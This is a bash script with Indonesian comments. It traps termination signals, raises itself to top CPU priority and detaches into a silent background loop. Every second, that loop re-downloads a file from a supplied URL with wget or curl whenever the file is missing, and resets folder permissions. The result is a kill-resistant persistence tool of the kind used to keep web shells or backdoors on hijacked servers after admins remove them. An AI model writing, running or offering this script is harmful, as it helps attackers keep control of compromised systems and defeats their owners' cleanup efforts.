#!/bin/bash

# Menambahkan trap untuk mengabaikan sinyal kill
trap "" SIGTERM SIGINT SIGHUP SIGSTOP

# Cek apakah proses sudah berjalan
SCRIPT_NAME=$(basename "$0")
for pid in $(pidof -x "$SCRIPT_NAME"); do
    if [ $pid != $$ ]; then
        echo "Proses sudah berjalan"
        exit 1
    fi
done

# Memeriksa apakah 4 argumen telah diberikan
if [ $# -ne 4 ]; then
    echo "Usage: ./auto.sh {raw_url} {file_path} {folder_path} {chmod_value}"
    exit 1
fi

# Mendapatkan nilai argumen
RAW_URL=$1
FILE_PATH=$2
FOLDER_PATH=$3
CHMOD_VALUE=$4

# Fungsi untuk mengunduh file menggunakan wget (silent)
download_file_wget() {
    wget -q -O "$FILE_PATH" "$RAW_URL"
}

# Fungsi untuk mengunduh file menggunakan curl (silent)
download_file_curl() {
    curl -s -o "$FILE_PATH" "$RAW_URL"
}

# Fungsi untuk memeriksa dan mengubah permissions folder
check_folder_permissions() {
    if [ ! -d "$FOLDER_PATH" ]; then
        mkdir -p "$FOLDER_PATH"
    fi
    chmod 0755 "$FOLDER_PATH"
}

# Fungsi untuk memeriksa apakah file ada, jika hilang maka download ulang
check_and_download() {
    if [ ! -f "$FILE_PATH" ]; then
        if ! download_file_wget; then
            download_file_curl
        fi
    fi
    chmod "$CHMOD_VALUE" "$FOLDER_PATH"
}

# Mengatur prioritas proses
renice -n -20 -p $$ > /dev/null 2>&1

# Menjalankan loop utama dalam satu proses
(
while true; do
    check_folder_permissions
    check_and_download
    sleep 1
done
) >/dev/null 2>&1 &

disown

exit 0
